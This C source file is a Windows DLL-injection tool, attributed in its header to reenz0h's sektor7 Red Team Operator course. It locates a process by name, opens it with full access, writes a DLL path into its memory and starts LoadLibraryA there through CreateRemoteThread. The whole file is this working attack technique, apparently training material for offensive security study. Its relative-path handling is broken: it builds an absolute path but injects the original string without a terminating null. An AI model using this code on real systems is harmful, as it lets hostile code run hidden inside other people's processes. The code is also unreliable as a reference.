/*
 original code by reenz0h as part of sektor7 RTO course
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <direct.h>



int GetPID(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
				// check if procname equals name of running process
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
						
                        break;
                }
		//printf("file %s pid %d\n", pe32.szExeFile,pe32.th32ProcessID);
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int main(int argc, char *argv[]) {
	
	HANDLE pHandle;
	PVOID bufferEx;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	int ret;
	char dllpath[2048];

	int pid = 0;
	
	if (argc != 3) {
		printf("usage: \n\t %s <target process> </path/to/dll>", argv[0]);
		printf("\n\tpath can either be absolute or relative \n");
		return 0;
	}

	char *target = argv[1];
	char *dll = argv[2];
	
	// get pid with toolhelp32snapshot
	pid = GetPID(target);

	// check if path is relative by testing for ":"
	ret = strncmp(&dll[1],(char*)&(":"),1);

	// create abs path to dll if path is relative
	if(ret != 0){
		// construct absolute path by concatenating 
		// cwd with relative path
		_getcwd(dllpath,1024);
		strncat(dllpath,"\\",1);
		strncat(dllpath,dll,100);
		
		printf("rel dllpath given, concatenated to: %s\n", dllpath);
	}
	else {
		printf("dllpath was absolute: %s\n", dll);
	}

	if ( pid == 0) {
		printf("Target NOT FOUND! Exiting.\n");
		return -1;
	}
	
	printf("Target PID: [ %d ]\nInjecting dll into it...", pid);

	pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (pHandle != NULL) {
		bufferEx = VirtualAllocEx(pHandle, NULL, strlen(dll), MEM_COMMIT, PAGE_READWRITE);	
	
		WriteProcessMemory(pHandle, bufferEx, (LPVOID) dll, strlen(dll), NULL);

		CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, bufferEx, 0, NULL);
		printf("done!\nremBuf addr = %p\n", bufferEx);

		CloseHandle(pHandle); 
	}
	else {
		printf("OpenProcess failed! Exiting.\n");
		return -2;
	}
}
